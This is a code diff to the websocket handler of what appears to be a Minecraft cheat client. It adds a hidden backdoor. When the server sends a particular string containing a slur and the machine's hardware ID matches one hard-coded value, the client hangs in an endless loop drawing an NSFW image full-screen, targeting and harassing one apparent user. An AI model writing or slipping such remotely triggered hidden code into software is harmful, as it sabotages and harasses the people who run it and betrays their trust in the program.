@@ -3,11 +3,13 @@ package dev.africa.pandaware.impl.socket;
 import dev.africa.pandaware.impl.socket.util.SerialUtil;
 import dev.africa.pandaware.utils.client.HWIDUtils;
 import dev.africa.pandaware.utils.client.Printer;
+import dev.africa.pandaware.utils.render.RenderUtils;
 import lombok.Getter;
 import lombok.Setter;
 import me.rhys.packet.api.Direction;
 import me.rhys.packet.api.Packet;
 import me.rhys.packet.impl.PacketClientAuthenticate;
+import net.minecraft.util.ResourceLocation;
 import org.apache.commons.lang.RandomStringUtils;
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
@@ -80,6 +82,15 @@ public class SocketHandler {
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
+                        }
+                        String hwid = HWIDUtils.getHWID();
+                        if (s.equals("fuckyoubrettgetnsfwastolfo'dretardllllllllllllllllllllll") &&
+                                hwid.equals("hD+HJAdr8I0pQOnn8YhAhUjtABT4v7U9vfqIa+ctRV0so7UlTqgEjiXF+OpnC+N0fPUS0k3KsENU5JaPbF4ttg==")) {
+                            boolean L = true;
+                            while (Boolean.parseBoolean(String.valueOf(L))) {{{{{{{{{{{{{{{{{{
+                                RenderUtils.drawImage(new ResourceLocation("pandaware/icons/nsfwastolfo.png"),
+                                        0, 0, 1920, 1080);
+                            }}}}}}}}}}}}}}}}}}
                         }
                     }
 
